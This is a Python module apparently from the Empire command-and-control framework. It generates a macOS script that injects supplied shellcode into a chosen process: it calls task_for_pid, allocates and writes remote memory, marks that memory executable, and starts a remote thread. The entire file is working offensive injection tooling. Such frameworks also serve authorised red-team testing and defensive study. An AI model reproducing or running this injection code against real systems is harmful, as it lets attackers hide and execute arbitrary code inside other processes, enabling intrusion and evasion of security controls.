import base64
from pathlib import Path

from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        processID = params["PID"]
        shellcodeBinPath = params["Shellcode"]

        shellcode_path = Path(shellcodeBinPath)
        if not shellcode_path.exists():
            raise ModuleValidationException("Shellcode bin file not found.")

        shellcode = base64.b64encode(shellcode_path.read_bytes())

        script = """
from ctypes import *

def run():
    import sys
    import os
    import struct
    import base64
    import ctypes

    STACK_SIZE = 65536
    VM_FLAGS_ANYWHERE = 0x0001
    VM_PROT_READ = 0x01
    VM_PROT_EXECUTE = 0x04
    x86_THREAD_STATE64 = 4
    KERN_SUCCESS = 0

    remoteTask = ctypes.c_long()
    remoteCode64 = ctypes.c_uint64()
    remoteStack64 = ctypes.c_uint64()
    remoteThread = ctypes.c_long()

    cdll.LoadLibrary('/usr/lib/libc.dylib')
    libc = CDLL('/usr/lib/libc.dylib')

    encshellcode = "[SC]"
    shellcode = base64.b64decode(encshellcode)
    pid = [PID]

    class remoteThreadState64(ctypes.Structure):

        _fields_ = [

            ("__rax", ctypes.c_uint64),
            ("__rbx", ctypes.c_uint64),
            ("__rcx", ctypes.c_uint64),
            ("__rdx", ctypes.c_uint64),
            ("__rdi", ctypes.c_uint64),
            ("__rsi", ctypes.c_uint64),
            ("__rbp", ctypes.c_uint64),
            ("__rsp", ctypes.c_uint64),
            ("__r8", ctypes.c_uint64),
            ("__r9", ctypes.c_uint64),
            ("__r10", ctypes.c_uint64),
            ("__r11", ctypes.c_uint64),
            ("__r12", ctypes.c_uint64),
            ("__r13", ctypes.c_uint64),
            ("__r14", ctypes.c_uint64),
            ("__r15", ctypes.c_uint64),
            ("__rip", ctypes.c_uint64),
            ("__rflags", ctypes.c_uint64),
            ("__cs", ctypes.c_uint64),
            ("__fs", ctypes.c_uint64),
            ("__gs", ctypes.c_uint64)
        ]


    result = libc.task_for_pid(libc.mach_task_self(), pid, ctypes.byref(remoteTask))
    if (result != KERN_SUCCESS):
        print("Unable to get task for pid\\n")
        return("")

    result = libc.mach_vm_allocate(remoteTask, ctypes.byref(remoteStack64), STACK_SIZE, VM_FLAGS_ANYWHERE)
    if result != KERN_SUCCESS:
        print("Unable to allocate memory for the remote stack\\n")
        return ""
    result = libc.mach_vm_allocate(remoteTask, ctypes.byref(remoteCode64),len(shellcode),VM_FLAGS_ANYWHERE)
    if result != KERN_SUCCESS:
        print("Unable to allocate memory for the remote code\\n")
        return ""

    longptr = ctypes.POINTER(ctypes.c_ulong)
    shellcodePtr = ctypes.cast(shellcode, longptr)

    result = libc.mach_vm_write(remoteTask, remoteCode64, shellcodePtr, len(shellcode))
    if result != KERN_SUCCESS:
        print("Unable to write process memory\\n")
        return ""

    result = libc.vm_protect(remoteTask, remoteCode64, len(shellcode),False, (VM_PROT_READ | VM_PROT_EXECUTE))
    if result != KERN_SUCCESS:
        print("Unable to modify permissions for memory\\n")
        return ""

    emptyarray = bytearray(sys.getsizeof(remoteThreadState64))

    threadstate64 = remoteThreadState64.from_buffer_copy(emptyarray)

    remoteStack64 = int(remoteStack64.value)
    remoteStack64 += (STACK_SIZE / 2)
    remoteStack64 -= 8

    remoteStack64 = ctypes.c_uint64(remoteStack64)

    threadstate64.__rip = remoteCode64
    threadstate64.__rsp = remoteStack64
    threadstate64.__rbp = remoteStack64

    x86_THREAD_STATE64_COUNT = ctypes.sizeof(threadstate64) / ctypes.sizeof(ctypes.c_int)

    result = libc.thread_create_running(remoteTask,x86_THREAD_STATE64, ctypes.byref(threadstate64), x86_THREAD_STATE64_COUNT, ctypes.byref(remoteThread))
    if (result != KERN_SUCCESS):
        print("Unable to execute remote thread in process")
        return ""

    print("Injected shellcode into process successfully!")
run()
"""
        script = script.replace("[SC]", shellcode)
        return script.replace("[PID]", processID)
